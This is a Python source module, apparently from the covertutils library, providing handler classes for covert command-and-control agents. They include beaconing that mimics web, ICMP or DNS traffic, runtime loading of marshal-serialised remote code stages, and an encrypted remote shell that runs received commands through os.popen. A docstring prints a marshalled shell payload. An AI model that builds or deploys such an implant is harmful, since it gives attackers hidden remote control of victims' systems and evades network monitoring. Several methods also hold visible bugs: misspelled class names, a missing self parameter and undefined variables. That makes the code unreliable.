"""

This module provides a template for Automatic protocol creation.
The base class :class:`covertutils.BaseHandler` provide an API with methods:
 - onChunk()
 - onMessage()
 - onNotRecognized()

Subclassing the `BaseHandler` class needs an implementation of the above methods.

.. code:: python

	from covertutils.handlers import BaseHandler

	class MyHandler( BaseHandler ) :

		def onMessage( self, stream, message ) :
			print "Got Message '%s' from Stream %s" % ( stream, message )

		def onChunk( self, stream, message ) :
			print "Got Chunk from Stream %s" % ( stream, message )
			if message != '' :
				print "This was the last chunk of a message"

		def onNotRecognised( self ) :
			print "Got Garbage Data"

Creating a `MyHandler` Object needs 2 wrapper functions for raw data **sending** and **receiving**.
The receiving function needs to be **blocking**, just like :func:`socket.socket.recv`
Also a :class:`covertutils.orchestration.StackOrchestrator` object is required to handle data chunking, compression and encryption.

.. code:: python

	passphrase = "Th1s1sMyS3cr3t"
	orch = StackOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50 )

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect( addr )

	def recv () :
		return s.recv(50)

	def send( raw ) :
		return s.send( raw )

	handler_obj = MyHandler( recv, send, orch )


Then it is possible to send `messages` to other `Handler` instances using the `sendAdHoc()` method.

.. code:: python

	handler_obj.sendAdHoc( "Hello from me" )

Everytime a message is received, the overriden `onMessage()` method will run.

For the Handler at the other side of the channel, to properly decrypt and handle the binary sent by `handler_obj` it is needed to be instantiated with the :func:`covertutils.orchestration.StackOrchestrator.__init__` argument ""**reverse = True**""

.. code:: python

	passphrase = "Th1s1sMyS3cr3t"
	orch2 = StackOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True )

	handler_obj2 = MyHandler( recv2, send2, orch2 )


The `Handler` Classes are designed for **Multiple Inheritance** for further flexibility.
For instance a Querying, Stageable agent can be implemented like below:

.. code:: python

	from covertutils.handlers import CommandFetcherHandler, StageableHandler

 	class MyHandler2( CommandFetcherHandler, StageableHandler ) :

		def __init__( self, recv, send, orch, **kw ) :
			super( MyHandler, self ).__init__( recv, send, orch, **kw )

		def onChunk( self, stream, message ) :pass
		def onNotRecognised( self ) :pass

Now, creating a `MyHandler2` object needs the 3 standard arguments (inherited from :func:`covertutils.handlers.BaseHandler.__init__`), and all optional arguments that are needed by the provided `Parent Classes`.

"""

from abc import ABCMeta, abstractmethod
from time import sleep
from threading import Thread

from random import uniform

import marshal, types
from covertutils.payloads import CommonStages
from covertutils.helpers import defaultArgMerging


class BaseHandler :
	"""
Subclassing this class and overriding its methods automatically creates a threaded handler.
"""

	__metaclass__ = ABCMeta


	def __init__( self, recv, send, orchestrator, **kw ) :
		"""
:param `function` recv: A **blocking** function that returns every time a chunk is received. The return type must be raw data, directly fetched from the channel.
:param `function` send: A function that takes raw data as argument and sends it across the channel.
:param `orchestration.StackOrchestrator` orchestrator: An Object that is used to translate raw data to `(stream, message)` tuples.
		"""
		self.receive_function = recv
		self.send_function = send
		self.orchestrator = orchestrator

		self.__protocolThread = Thread( target = self.__protocolThreadFunction )
		self.__protocolThread.daemon = True
		self.__protocolThread.start()


	def __consume( self, stream, message ) :
		"""
:param str stream: The stream that the message is a send.
:param str message: The message in plaintext. Empty string if not fully-assembled.
:rtype: None
		"""
		if stream == None :
			self.onNotRecognised()
			return
		self.onChunk( stream, message )
		if message :
			self.onMessage( stream, message )


	@abstractmethod
	def onChunk( self, stream, message ) :
		"""
**AbstractMethod**

This method runs whenever a new recognised chunk is consumed.

:param str stream: The recognised stream that this chunk belongs.
:param str message: The message that is contained in this chunk. Empty string if the chunk is not the last of a reassembled message.

This method will run even to for chunks that will trigger the `onMessage()` method. To stop that you need to add the above code in the beginning.

.. code:: python

	if message != '' :	# meaning that the message is assembled, so onMessage() will run
		return

"""
		pass


	@abstractmethod
	def onMessage( self, stream, message ) :
		"""
**AbstractMethod**

This method runs whenever a new message is assembled.

:param str stream: The recognised stream that this chunk belongs.
:param str message: The message that is contained in this chunk.
"""
		pass


	@abstractmethod
	def onNotRecognised( self ) :
		"""
**AbstractMethod**

This method runs whenever a chunk is not recognised.

:rtype: None

"""
		pass


	def sendAdHoc( self, message, stream = None, assert_len = 0 ) :
		"""
This method uses the object's `StackOrchestrator` instance to send raw data to the other side, throught the specified `Stream`.
If `stream` is `None`, the default Orchestrator's stream will be used.

:param str message: The `message` send to the other side.
:param str stream: The `stream` name that will tag the data.
:param int assert_len: Do not send if the chunked message exceeds `assert_len` chunks.
:rtype: bool

`True` is returned when the message is sent, `False` otherwise.
"""
		if stream == None :
			stream = self.orchestrator.getDefaultStream()
		chunks = self.orchestrator.readyMessage( message, stream )
		if assert_len != 0 :
			if len(chunks) > assert_len :
				return False
		for chunk in chunks :
			self.send_function( chunk )
		return True


	def __protocolThreadFunction( self ) :
		while True :
			raw_data = self.receive_function()
			stream, message = self.orchestrator.depositChunk( raw_data )
			self.__consume( stream, message )

# ==================================================================================================


class CommandFetcherHandler( BaseHandler ) :
	"""
This handler has a beaconing behavior, repeatedly querring the channel for messages. This behavior is useful on agents that need to have a client-oriented traffic.
HTTP/S agents (meterpreter HTTP/S) use this approach, issueing HTTP (GET/POST) requests to the channel and executing messages found in HTTP responses.
This behavior can simulate Web Browsing, ICMP Ping, DNS traffic schemes.

This handler can be nicely coupled with :class:`covertutils.handlers.ResponseOnlyHandler` for a Server-Client approach.
"""

	__metaclass__ = ABCMeta

	Defaults = { 'request_data' : 'X', 'delay_between' : (1.0, 2.0), 'fetch_stream' : 'control' }

	def __init__( self,  recv, send, orchestrator, **kw ) :
		"""
:param str request_data: The actual payload that is used in messages thet request data.
:param tuple delay_between: A `tuple` containing 2 `floats` or `ints`. The beaconing intervals will be calculated randomly between these 2 numbers.
:param str fetch_stream: The stream where all the beaconing will be tagged with.
		"""
		super(CommandFetcherHandler, self).__init__( recv, send, orchestrator, **kw )

		self.Defaults['fetch_stream'] = orchestrator.getDefaultStream()
		arguments = defaultArgMerging( self.Defaults, kw )

		self.request_data = arguments['request_data']
		self.delay_between = arguments['delay_between']
		self.fetch_stream = arguments['fetch_stream']

		self.fetcher_thread = Thread( target = self.__fetcher_function )
		self.fetcher_thread.daemon = True
		self.fetcher_thread.start()


	def __fetcher_function( self, ) :

		while True :
			if not self.delay_between : continue	# to beat a race condition
			delay = uniform( *self.delay_between )
			sleep( delay )
			self.sendAdHoc( self.request_data, self.fetch_stream )



# ==================================================================================================


class FunctionDictHandler( BaseHandler ) :
	"""

This class provides a per-stream function dict.
If a message is received from a `stream`, a function corresponding to this particular stream will be executed with single argument the received message.
The function's return value will be sent across that stream to the message's sender.

Ideal for simple `remote shell` implementation.

The FunctionDictHandler class implements the `onMessage()` function of the BaseHandler class.
The `function_dict` passed to this class `__init__()` must have the above format:

.. code:: python

	def os_echo( message ) :
		from os import popen
		resp = popen( "echo %s" % 'message' ).read()
		return resp

	function_dict = { 'echo' : os_echo }

Note: The functions must be **absolutely self contained**. In the above example the `popen()` function is imported inside the `os_echo`. This is to ensure that `popen()` will be available, as there is no way to tell if it will be imported from the handler's environment.

Well defined functions for that purpose can be found in :mod:`covertutils.payloads`. Also usable for the :class:`StageableHandler` class

.. code:: python

	from covertutils.payloads import CommonStages
	pprint( CommonStages )
	{'shell': {'function': <function __system_shell at 0x7fc347472320>,
		   'marshal': 'c\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00C\\x00\\x00\\x00s&\\x00\\x00\\x00d\\x01\\x00d\\x02\\x00l\\x00\\x00m\\x01\\x00}\\x01\\x00\\x01|\\x01\\x00|\\x00\\x00\\x83\\x01\\x00j\\x02\\x00\\x83\\x00\\x00}\\x02\\x00|\\x02\\x00S(\\x03\\x00\\x00\\x00Ni\\xff\\xff\\xff\\xff(\\x01\\x00\\x00\\x00t\\x05\\x00\\x00\\x00popen(\\x03\\x00\\x00\\x00t\\x02\\x00\\x00\\x00osR\\x00\\x00\\x00\\x00t\\x04\\x00\\x00\\x00read(\\x03\\x00\\x00\\x00t\\x07\\x00\\x00\\x00messageR\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00result(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00s\\x15\\x00\\x00\\x00covertutils/Stages.pyt\\x0e\\x00\\x00\\x00__system_shell\\x04\\x00\\x00\\x00s\\x06\\x00\\x00\\x00\\x00\\x01\\x10\\x01\\x12\\x01'}}

	"""

	__metaclass__ = ABCMeta

	def __init__( self,  recv, send, orchestrator, **kw ) :
		"""
:param dict function_dict: A dict containing `(stream_name, function)` tuples. Every time a message is received from `stream_name`, `function(message)` will be automatically executed.
		"""
		super( FunctionDictHandler, self ).__init__( recv, send, orchestrator, **kw )
		try :
			self.function_dict = kw['function_dict']
		except :
			raise NoFunctionAvailableException( "No Function dict provided to contructor" )


	def onMessage( self, stream, message ) :
		"""
:raises: :exc:`NoFunctionAvailableException`
		"""
		# super( FunctionDictHandler, self ).onMessage( stream, message )
		if stream in self.function_dict.keys() :
			resp = self.function_dict[ stream ]( message )
			return stream, resp
		else :
			raise NoFunctionAvailableException( "The stream '%s' does not have a corresponding function." % stream )


# ==================================================================================================


class StageableHandler ( FunctionDictHandler ) :
	"""
The StageableHandler is a :class:`covertutils.handlers.FunctionDictHandler` that can load payloads (stages) during execution. Additional functions can be sent in a serialized form (ready stages can be found in :mod:`covertutils.payloads`).
The stage function have to be implemented according to :class:`covertutils.handlers.FunctionDictHandler` documentation.

To running `StageableHandler`s, additional functions can be packed with the :func:covertutils.handlers.`StageableHandler.createStageMessage` and sent like normal messages with a `sendAdHoc` call.
"""

	__delimiter = ':'
	__add_action = "A"
	__replace_action = "R"
	__delete_action = "D"

	Defaults = { 'stage_stream' : 'stage' }

	def __init__( self, recv, send, orchestrator, **kw ) :
		"""
:param str stage_stream: The stream where all stages will be received.
		"""
		super(StagableHandler, self).__init__( recv, send, orchestrator, **kw )

		arguments = defaultArgMerging( self.Defaults, kw )
		self.stage_stream = arguments['stage_stream']

		if  self.stage_stream not in self.orchestrator.getStream() :
			self.orchestrator.addStream( self.stage_stream )


	def onMessage( self, stream, message ) :
		super( StagableHandler, self ).onMessage( )
		if stream in self.function_dict.keys() :
			self.function_dict[ stream ]( message )
		else :
			raise NoFunctionAvailableException( "The stream '%s' does not have a corresponding function." % stream )


	def __staging( self, message ) :
		stream_name, action, serialized_function = message.split( self.__delimiter, 2 )
		function_code = marshal.loads( serialized_function )
		function = types.FunctionType(function_code, globals(), stream_name+"_handle")
		if action == self.__add_action :
			self.orchestrator.addStream( stream_name )
			self.function_dict[ stream ] = function
		elif action == self.__delete_action :
			self.orchestrator.deleteStream( stream_name )
			del self.function_dict[ stream ]
		elif action == self.__replace_action :
			self.function_dict[ stream ] = function



	def createStageMessage( self, stream, serialized_function, replace = True ) :
		"""
:param str stream: The stream where the new stage will receive messages from.
:param str serialized_function: The stage-function serialized with the `marshal` build-in package.
:param bool replace: If True the stage that currently listens to the given stream will be replaced.
		"""
		action = 'A'
		if replace :
			action = 'R'
		message = stream + StageableHandler.__delimiter + action + StageableHandler.__delimiter + serialized_function
		return message



class ResponseOnlyHandler( BaseHandler ) :
	"""
This handler doesn't send messages with the `sendAdHoc` method. It implements a method `queueSend` to queue messages, and send them only if it is queried with a `request_data` message.

Can be nicely paired with :class:`covertutils.handlers.CommandFetcherHandler` for a Client-Server approach.
	"""
	__metaclass__ = ABCMeta

	Defaults = {'request_data' : 'X'}

	def __init__( self,  recv, send, orchestrator, **kw ) :
		"""
:param str request_data: The data that, when received as message, a stored chunk will be sent.
		"""
		super(ResponseOnlyHandler, self).__init__( recv, send, orchestrator, **kw )

		arguments = defaultArgMerging( self.Defaults, kw )
		self.request_data = arguments['request_data']

		self.to_send_list = []
		self.to_send_raw = []


	def onMessage( self, stream, message ) :
		if message == self.request_data :
			if self.to_send_raw :
				to_send = self.to_send_raw.pop(0)
				self.send_function( to_send )


	def queueSend( self, message, stream = None ) :
		"""
:param str message: The message that will be stored for sending upon request.
:param str stream: The stream where the message will be sent.
"""
		if stream == None :
			stream = self.orchestrator.getDefaultStream()

		chunks = self.orchestrator.readyMessage( message, stream )
		self.to_send_raw.extend( chunks )




class ResettableHandler ( BaseHandler ) :
	"""
This handler can reset the :class:`covertutils.orchestration.StackOrchestrator` object (reset all crypto keys, stream identifiers, chunkers), in case the state between the agent and handler is lost.

	"""
	__metaclass__ = ABCMeta

	Defaults = { 'reset_data' : 'R' }

	def __init__( recv, send, orchestrator, **kw ) :
		super( ResettableHandler, self ).__init__( recv, send, orchestrator, **kw )

		self.Defaults['reset_data'] = orchestrator.getDefaultStream()
		arguments = defaultArgMerging( self.Defaults, kw )

		self.reset_data = arguments['reset_data']


	def reset( self, ) :
		self.orchestrator.reset()


	def sendReset( self ) :
		sendAdHoc( ResettableHandler.Defaults[reset_data] )


	def onMessage( self, stream, message ) :
		if message == self.Defaults[reset_data] :
			self.reset()
			return True
		return False



_function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }

class SimpleShellHandler ( FunctionDictHandler ) :
	"""
	This class provides an implementation of Simple Remote Shell.
	It can be used on any shell type and protocol (bind, reverse, udp, icmp, etc),by adjusting `send_function()` and `receive_function()`

	All communication is chunked and encrypted, as dictated by the :class:`covertutils.orchestration.StackOrchestrator` object.

	This class directly executes commands on a System Shell (Windows or Unix) via the :func:`os.popen` function. The exact stage used to execute commands is explained in :mod:`covertutils.Stages`
"""

	def __init__( self, recv, send, orchestrator ) :
		"""
:param function receive_function: A **blocking** function that returns every time a chunk is received. The return value must be return raw data.
:param function send_function: A function that takes raw data as argument and sends it across.
:param `orchestration.StackOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
		"""
		super( SimpleShellHandler, self ).__init__( recv, send, orchestrator, function_dict =  _function_dict )


	def onMessage( self, stream, message ) :
		stream, resp = super( SimpleShellHandler, self ).onMessage( stream, message )
		self.sendAdHoc( resp, stream )


	def onChunk( self, stream, message ) :
		pass


	def onNotRecognised( self ) :
		pass
